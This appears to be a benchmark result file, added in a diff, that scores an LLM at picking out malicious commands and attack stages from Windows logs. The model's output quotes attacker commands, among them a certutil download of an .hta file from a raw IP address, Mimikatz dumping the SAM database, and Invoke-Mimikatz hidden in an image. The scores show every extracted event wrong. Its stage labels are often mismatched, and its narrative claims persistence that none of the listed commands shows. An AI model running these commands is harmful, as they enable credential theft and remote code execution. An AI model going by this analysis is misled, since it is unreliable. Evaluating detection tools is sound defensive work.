@@ -1,0 +1,76 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\H3XEP5DG\\Test[1].hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "echo \"Hello from the Windows Command Prompt!\" > \"%TEMP%\\test.bin\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "certutil.exe -encode a.txt b.txt && del /f /q b.txt",
+        "stage": "Credential Dumping"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::sam exit",
+        "stage": "Credential Theft"
+      },
+      {
+        "command": "nltest /domain_trusts",
+        "stage": "Discovery/Lateral Movement"
+      },
+      {
+        "command": "powerhollow.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Privilege Escalation/Credential Access"
+      }
+    ],
+    "narrative": "The analyzed evidence reflects a sophisticated attack where an attacker gains initial access via certutil, performs discovery and credential manipulation leveraging Mimikatz and nltest commands, establishes persistence through modified registry keys and scheduled tasks, and maintains presence through complex PowerShell scripts while attempting to elevate privileges.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 40789,
+      "completion_tokens": 1091,
+      "total_tokens": 41880,
+      "wall_clock_s": 36.049,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 6,
+      "fn": 14
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 6,
+      "fn": 14,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.08333333333333333,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 40789,
+      "completion_tokens": 1091,
+      "total_tokens": 41880,
+      "wall_clock_s": 36.049,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
